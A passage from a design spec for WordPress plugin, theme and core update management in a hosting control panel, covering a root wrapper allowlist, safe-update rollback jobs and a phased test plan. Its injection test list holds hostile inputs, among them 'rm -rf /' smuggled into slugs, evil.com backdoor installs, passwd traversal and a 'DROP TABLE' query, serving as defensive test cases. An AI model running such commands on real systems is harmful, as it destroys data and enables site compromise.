- Per-item auto-update toggles (wp plugin/theme auto-updates enable/disable)
- Site-wide core auto-update setting (via `site-config-apply` / `WP_AUTO_UPDATE_CORE`)
- Scheduled auto-updates via a new `auto-update-schedule-apply` op + systemd timer
  (Off / Weekly / Daily)
- Safe-update compound job (backup → update → smoke+TTFB → auto-restore), operator-
  accessible, sequential bulk
- Plugins and Themes table UI with per-row actions
- "Update all (safely)" and "Update all" bulk buttons
- Core update card with safe-update option
- Wrapper security review (gating condition for merge)

### Out of scope

- **Plugin/theme install from the panel** — excluded by owner decision (#1). Owners
  install via wp-admin; installed items appear in the inventory on the next refresh.
  (This also permanently excludes ZIP-URL install as an RCE vector.)
- **Screenshot/visual regression diff** — requires headless Chromium; deferred.
  The HTTP+TTFB+smoke approach covers ~80% of regressions cheaply.
- **Multi-site / network plugin management** — `network_active` is surfaced in the
  inventory but per-network ops are deferred.
- **WP CLI package management** — explicitly blocked at the wrapper.
- **Rollback to an arbitrary older version** — `restore` already handles this via
  the backup browser (extra D, out of scope here).
- **Staging-first safe-update** — apply to staging, smoke, then promote. A strong
  pattern, but depends on both staging existing and safe-update being proven first.
  Revisit in extra A.

---

## 8. Phased build outline

All phases are TDD-first. The wrapper allowlist test suite is the critical path.

### Phase 0 — Prerequisite: feature #3 insights op

Feature #3 must ship the `insights` op and `insights.json` drop-file before the
plugin/theme UI can be driven from inventory data. Feature #4 can be built in
parallel against fixtures but the UI will show stubs until #3 lands.

### Phase 1 — Wrapper allowlist widening + test suite (critical path)

1. Write `test/wrapper/validate_wp_args.bats` (Bash BATS or equivalent) covering:
   - All allowed verb × namespace combinations (positive cases) — **no install**
   - All injection vectors from §10 (negative cases), including `install` rejected
   - Slug boundary cases (63-char valid, 64-char rejected, URL rejected)
   - `--version=` valid and injection cases
   - `--path=`, `--url=` blocked
2. Update `validate_wp_args` in `bin/vibe-panel-run` to the structured allowlist.
3. All existing passing tests must still pass (the 3 legacy forms are subsumed).
4. **Gate:** wrapper security review passes (independent reviewer, not the author).

### Phase 2 — `VIBE_OPS` expansion + panel-side slug validation

1. Add all new entries to `VIBE_OPS` in `exec.ts` (no install ops).
2. Add `assertSlug` to `exec.ts` and call it from `buildVibeArgv` when `takesArg`.
3. Write unit tests in `core-bridge/exec.test.ts` for slug validation.

### Phase 3 — New routers

1. `routers/plugins.ts` — per-item actions + auto-update toggle + safeUpdate.
2. `routers/themes.ts` — per-item actions + auto-update toggle (theme parity).
3. Update `routers/updates.ts` to expose core update card data from insights.
4. Wire routers into the tRPC root.
5. Unit tests for each router (mock `runVibe` / `startJob`), asserting tier
   enforcement (operator vs admin).

### Phase 4 — Auto-update schedule op

1. Write `bin/auto-update-schedule-apply` (modeled on `bin/backup-schedule-apply`).
2. Add `autoUpdateScheduleApply` to `VIBE_OPS` and `OP_ALLOWLIST`.
3. Add router handler (operator-level).
4. Unit + integration tests.

### Phase 5 — Safe-update compound job

1. Write `core-bridge/safe-update.ts` with the chained flow (§4.1).
2. Write unit tests with mocked sub-ops (backup, update, smoke, restore).
3. Write integration test with a real local Docker stack (skip in CI, run on VPS).
4. Add `safeUpdate` endpoint to `routers/plugins.ts` (operator procedure).

### Phase 6 — UI

1. Plugins table component (reads from insights via tRPC, per-row action menu).
2. Themes table component (same structure).
3. Safe-update progress view (reuse `StreamingJobView`).
4. Core update card (update + safe-update buttons).
5. Auto-update toggles (per-row + site-wide core setting).
6. "Update all (safely)" and "Update all" bulk buttons.

### Phase 7 — VPS validation

Deploy to the test VPS. Validate:
- Plugin activate / deactivate / update on a real plugin.
- `wp plugin delete` on a real (inactive) plugin.
- Theme activate / update.
- Safe-update: inject a deliberate regression (temporary), confirm auto-restore.
- Auto-update toggle round-trip.
- Scheduled update timer installed and listed by `systemctl`.
- Injection test suite run against the live wrapper (confirm `install` rejected).

---

## 9. Resolved decisions

All previously-open owner decisions are resolved in §0. No open decisions remain.
The single remaining **gate** before merge is the §5.3 wrapper security review by
an independent reviewer.

---

## 10. Testing & validation

### 10.1 Wrapper allowlist injection tests (critical)

These must pass before the phase-1 wrapper change is merged. Run via BATS or a
shell test harness against the live `validate_wp_args` function.

**Positive (must accept):**

```
wp plugin activate contact-form-7
wp plugin deactivate woocommerce
wp plugin update akismet
wp plugin delete hello-dolly
wp plugin auto-updates enable redis-cache
wp plugin auto-updates disable redis-cache
wp theme activate twentytwentyfour
wp theme update astra
wp theme delete storefront
wp core update
wp core update --version=6.8.1
wp plugin update --all          # legacy form must still work
wp plugin list --update=available --format=json   # legacy form must still work
```

**Negative (must reject):**

```sh
# install is no longer an allowed verb (owner decision #1)
wp plugin install query-monitor
wp theme install hello-elementor
wp plugin install "https://evil.com/backdoor.zip"
wp plugin install "http://evil.com/shell.php"

# Metacharacter injection via slug
wp plugin activate "contact-form-7; rm -rf /"
wp plugin update "woo$(whoami)merce"
wp plugin delete "woo|evil"
wp plugin delete "../../../etc/passwd"

# Path traversal flags
wp plugin update akismet --path=/tmp/evil
wp plugin activate akismet --url=https://evil.com
wp plugin update akismet --require=/tmp/evil.php

# Blocked verbs
wp eval "system('id')"
wp eval-file /tmp/evil.php
wp db query "DROP TABLE wp_users"
wp shell
wp config set DB_PASSWORD evil
wp search-replace old new

# Namespace injection
wp INVALID activate slug
wp plugin INVALID slug

# Version flag injection
wp plugin update akismet --version="1.0; rm -rf /"
wp core update --version="6.8.1 && evil"

# Multi-arg attacks
wp plugin activate slug1 slug2
wp plugin update slug1 slug2 slug3

# Slug length
wp plugin activate "$(python3 -c "print('a'*64)")"

# Empty slug
wp plugin activate ""
wp plugin update
```

### 10.2 Unit tests (panel side)

- `assertSlug`: accepts valid, rejects URL/metacharacter/empty/too-long.
- `buildVibeArgv` with each new op: confirms argv shape.
- Each router handler: mocked `startJob`, confirms correct `op` + `args` + procedure
  tier enforcement driven by `WP_ACTION_TIERS` (delete + standalone restore reject
  operators; activate/deactivate/update/core update/safeUpdate accept operators).
- `WP_ACTION_TIERS` / `procedureFor`: a table-driven test asserting every action key
  maps to the documented tier (guards against a silent miswiring).
- Safe-update unit: each branch (success, smoke-fail→restore, restore-fail).

### 10.3 Integration tests

- Full safe-update flow against a local Docker stack (backup → update → smoke →
  succeed); requires `WP_HOME` resolvable from the test runner.
- Safe-update rollback: simulate a smoke failure, confirm restore is triggered and
  verified, and that it used the in-job snapshot (not the standalone admin restore).

### 10.4 VPS validation checklist

- [ ] `wp plugin activate` / `deactivate` round-trip on a real plugin
- [ ] `wp plugin update` on a single plugin with an available update
- [ ] `wp plugin delete` on an inactive plugin (admin only)
- [ ] `wp theme activate` + `update`
- [ ] Auto-update toggle: enable → check `wp plugin auto-updates status`; disable → revert
- [ ] `auto-update-schedule-apply weekly` → `systemctl list-timers | grep vibe-wp-autoupdate`
- [ ] Safe-update with success: fresh backup listed, update applied, smoke passes
- [ ] Safe-update with failure: smoke artificially broken, auto-restore triggered, site returns to pre-update state
- [ ] Operator account can run update (plugin/theme/core) + safe-update; operator account is rejected from delete + standalone restore
- [ ] Injection test suite from §10.1 run on the live wrapper binary, including `wp plugin install` rejected

---

## 11. References

- `bin/vibe-panel-run` — root privilege boundary; `validate_wp_args` (lines 198–209), `validate_wp_slug` (to be added), `OP_ALLOWLIST` (line ~179), `FLAG_ALLOWLIST` (line ~188)
- `control-panel/packages/api/src/core-bridge/exec.ts` — `VIBE_OPS`, `buildVibeArgv`, `wrapVibeArgv`, `streamVibe`, `runVibe`
- `control-panel/packages/api/src/core-bridge/jobs.ts` — `startJob`, `launchJob`, `drainJob`, `JobEntry`, `LineStream`
- `control-panel/packages/api/src/routers/updates.ts` — existing `updatesAvailable` + `updatesApply`
- `control-panel/packages/api/src/routers/backups.ts` — `backupsRun`, `backupsRestore` (admin), `backupsVerify` (safe-update borrows these patterns)
- `bin/backup` — backup op script (manifest.txt format, `--local-only` flag)
- `bin/restore` — restore op script (`--yes` required, auto-fetches from R2)
- `bin/smoke` — smoke test script (doctor-runtime + HTTP + FastCGI HIT + upload check)
- `docs/superpowers/specs/2026-06-23-feature-3-insights-plugin-design.md` — insights drop-file spec (inventory source for this feature)
- `docs/superpowers/ROADMAP.md` — feature #4 row; cross-cutting rule for all panel→host capabilities
- WP-CLI docs: `wp plugin` / `wp theme` / `wp core` subcommand reference
- Plesk Smart Updates (conceptual reference for the safe-update flow)
